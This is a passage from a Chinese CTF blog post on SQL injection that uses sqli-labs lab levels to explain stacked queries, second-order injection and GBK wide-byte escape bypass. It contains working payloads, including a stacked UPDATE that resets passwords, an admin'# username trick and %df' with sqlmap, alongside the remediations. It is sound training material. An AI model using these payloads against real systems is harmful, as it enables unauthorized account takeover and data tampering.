+<h3 id="5、堆叠查询"><a href="#5、堆叠查询" class="headerlink" title="5、堆叠查询"></a>5、堆叠查询</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例</p>
+<p><img src="https://img-blog.csdnimg.cn/20210325120628613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">id=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ <br></code></pre></td></tr></table></figure>
+
+<p>意思就是再更新id=1的用户密码为123456。如下成功执行了更新密码的语句</p>
+<p><img src="https://img-blog.csdnimg.cn/20210325120909611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>堆叠查询的局限性</strong></p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</p>
+<h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。</p>
+<ol>
+<li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</li>
+<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li>
+<li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li>
+<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</li>
+<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</li>
+</ol>
+<p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例</p>
+<p><strong>sqli-labs less-24</strong></p>
+<ol>
+<li>如下点击注册用户</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20210325171938838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里注册用户名为 admin’#</p>
+<p><img src="https://img-blog.csdnimg.cn/2021032517204294.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD</p>
+<p><img src="https://img-blog.csdnimg.cn/20210325172142765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ol start="2">
+<li>对注册的账号进行登录然后修改密码为ccccc</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20210325172253439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>此时提示密码已经成功修改了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210325172320556.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改</p>
+<p><img src="https://img-blog.csdnimg.cn/20210325172540390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>漏洞原因</strong></p>
+<ol>
+<li><p>在进行用户注册的允许存在’和#这种特殊字符</p>
+</li>
+<li><p>在修改密码页面的源码中，发现这里很明显存在注入漏洞</p>
+</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;<br></code></pre></td></tr></table></figure>
+
+<p>当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h3><p><strong>宽字节案例引入</strong>    </p>
+<p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用?id=1’ 进行测试的时候，发现提交的单引号会被转义[&#39;]。此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210324174905605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了mysql_query(“SET NAMES gbk”)，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210820152802384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 仔细看该函数，其利用正则匹配将 [ /，’，” ]这些三个符号都过滤掉了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821102033527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>关于preg_replace的正则用法可详看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114642034">命令执行与代码执行漏洞</a> 中搜索preg_replace </p>
+<p>而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：</p>
+<ol>
+<li>让斜杠（\）失去作用</li>
+<li>让斜杠（\）消失</li>
+</ol>
+<p>第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。</p>
+<p><strong>关于编码</strong></p>
+<p>在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码，可以详看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/115201653">计算机中的编码问题</a></p>
+<ol>
+<li>某字符的大小为一个字节时，称其字符为窄字节.</li>
+<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
+<li>所有英文默认占一个字节，汉字占两个字节</li>
+<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</li>
+</ol>
+<p><strong>宽字节注入</strong>    </p>
+<p>宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p>
+<p>​    由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p>
+<p>​    我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p>
+<ul>
+<li>‘      %27</li>
+<li>\      %5c</li>
+<li>%df&#39;  %df%5c’ =》 運’</li>
+</ul>
+<p>我们输入 ?id=1%df’，按道理来说将转义符吃掉了，结果应该是 id=’ 運’  ‘ ，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821100701673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，如下就正常了。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821100948766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 联合注入如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210324175615607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>GB2312与GBK的不同</strong></p>
+<p>gb2312和gbk应该都是宽字节家族的一员。但我们来做个小实验。把源码中set names修改成gb2312</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821231155171.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>结果就不能注入了，我开始不信，然后再把数据库编码也改成gb2312，也是不成功的。虽然执行的语句还是显示被转换成了中文了，但就是注入不成功</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821232112841.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>为什么，这归结于gb2312编码的取值范围。它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
+<p>所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。</p>
+<p><strong>宽字节注入注入方法</strong></p>
+<ol>
+<li>黑盒</li>
+</ol>
+<p>就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap.py -u <span class="hljs-string">&quot;http://localhost/sqli-labs-master/Less-32/?id=1%df%27&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>白盒</li>
+</ol>
+<p>查看mysql是否为GBK编码，且是否使用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821231155171.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210821232504840.png" srcset="/img/loading.gif" lazyload alt="img"> <img src="https://img-blog.csdnimg.cn/20210821233043656.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 如果存在上面说的，则存在宽字节注入。</p>
+<p><strong>宽字节注入修复</strong></p>
+<ol>
+<li>mysql_real_escape_string</li>
+</ol>
+<p>听说这个函数能抵御宽字节注入攻击。mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集。</p>
+<p> ‍于是，把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。但是我们发现还是一样注入成功了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821233922778.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210821233900317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>为什么，明明我用了mysql_real_escape_string，但却仍然不能抵御宽字符注入？</p>
+<p>原因就是，你没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍</p>
+<blockquote>
+<p>mysqli_set_charset(<em>connection,charset</em>)<em>;</em></p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>connection</em></td>
+<td align="left">必需。规定要使用的 MySQL 连接。</td>
+</tr>
+<tr>
+<td align="left"><em>charset</em></td>
+<td align="left">必需。规定默认字符集。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210821234529785.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 这样就防止了注入</p>
+<p><img src="https://img-blog.csdnimg.cn/20210821234552955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 即先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string来过滤用户输入。</p>
+<ol start="2">
+<li><p>设置参数,character_set_client=binary</p>
+</li>
+<li><p>使用utf-8编码</p>
+</li>
+</ol>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>————</p>
+<p>本Blog部分借鉴于：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">https://blog.csdn.net/qq_44159028/article/details/114325805</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yujia_666/article/details/90296495">https://blog.csdn.net/yujia_666/article/details/90296495</a></p>
+<p>如有侵权，请联系删除。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Web/" class="category-chain-item">Web</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF-SQL注入漏洞</div>
+      <div>https://davidpenn888.github.io/2023/08/20/CTF-Show-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>David Penn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/12/Docker-1-1/" title="Docker-入门1-1">
+                        <span class="hidden-mobile">Docker-入门1-1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/roomclean_project/parson.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
